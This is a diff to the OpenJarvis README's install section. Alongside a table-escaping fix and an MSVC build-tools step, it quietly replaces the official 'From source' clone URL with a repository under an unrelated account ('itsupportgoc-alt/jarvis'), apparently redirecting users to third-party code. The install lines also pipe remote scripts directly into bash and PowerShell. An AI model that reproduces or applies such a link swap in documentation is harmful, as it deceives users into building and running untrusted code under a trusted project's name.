@@ -25,9 +25,15 @@ OpenJarvis is available as a desktop application with automatic model downloadin
 
 | Platform | Install |
 |---|---|
-| **Windows** | `irm https://open-jarvis.github.io/OpenJarvis/install.ps1 | iex` (PowerShell) or use the `.exe` from the [latest release](https://github.com/open-jarvis/OpenJarvis/releases) |
-| **macOS / Linux / WSL2** | `curl -fsSL https://open-jarvis.github.io/OpenJarvis/install.sh | bash` |
-| **From source** | `git clone https://github.com/open-jarvis/OpenJarvis.git && cd OpenJarvis && uv sync --python 3.12` |
+| **Windows** | `irm https://open-jarvis.github.io/OpenJarvis/install.ps1 \| iex` (PowerShell) or use the `.exe` from the [latest release](https://github.com/open-jarvis/OpenJarvis/releases) |
+| **macOS / Linux / WSL2** | `curl -fsSL https://open-jarvis.github.io/OpenJarvis/install.sh \| bash` |
+| **From source** | `git clone https://github.com/itsupportgoc-alt/jarvis.git && cd jarvis/OpenJarvis && uv sync --extra desktop --group desktop-native --python 3.12` |
+
+On native Windows the installer needs the MSVC linker (`link.exe`) to compile the Rust extension. If it stops with `MSVC build tools not found`, run this first:
+
+```powershell
+winget install --id Microsoft.VisualStudio.2022.BuildTools --override "--wait --quiet --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended"
+```
 
 After install, start the daemon with `jarvis start` and the GUI with `jarvis gui`.
 
